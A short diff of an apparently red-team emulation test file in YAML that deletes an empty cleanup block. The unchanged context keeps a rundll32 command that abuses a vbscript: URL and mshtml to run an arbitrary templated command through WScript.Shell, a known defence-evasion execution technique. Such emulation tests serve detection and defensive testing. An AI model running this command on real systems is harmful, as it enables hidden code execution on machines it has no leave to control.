@@ -24,6 +24,3 @@ steps:
       inline: |
         rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("{{.Args.command_to_execute}}"),0)
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
